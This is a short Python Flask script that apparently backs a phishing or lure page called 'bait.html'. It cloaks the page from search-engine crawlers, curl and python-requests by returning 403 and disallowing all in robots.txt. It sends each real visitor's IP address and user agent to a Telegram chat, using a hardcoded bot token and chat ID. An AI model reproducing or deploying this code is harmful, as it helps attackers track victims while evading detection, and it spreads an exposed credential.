BOT_TOKEN = ""
CHAT_ID = ""
from flask import Flask, request, render_template, abort
import requests

app = Flask(__name__)

BOT_TOKEN = "7590817261:AAGL6vH2hi4NPd9x1Iikaqlk40p5xxQ0cBc"
CHAT_ID = "6908281054"

blocked_agents = [
    "Googlebot", "Bingbot", "Slurp", "DuckDuckBot", "Baiduspider", "YandexBot",
    "Sogou", "facebookexternalhit", "Facebot", "ia_archiver", "curl", "python-requests"
]

def send_to_telegram(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={"chat_id": CHAT_ID, "text": text}
        )
    except:
        pass

@app.route('/')
def index():
    ua = request.headers.get("User-Agent", "")
    ref = request.headers.get("Referer", "")
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)

    # ⛔ Bot Detection
    for bot in blocked_agents:
        if bot.lower() in ua.lower():
            return abort(403)

    # ⛔ Search engine redirect
    if any(s in ref for s in ['google.', 'bing.', 'yahoo.', 'duckduckgo.']):
        return abort(403)

    # ✅ Real User
    send_to_telegram(f"🎯 *Trap Hit!*\n📱 UA: {ua}\n🌐 IP: {ip}")
    return render_template("bait.html")

@app.route('/robots.txt')
def robots():
    return "User-agent: *\nDisallow: /", 200, {'Content-Type': 'text/plain'}
if __name__ == "__main__":
    import os
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
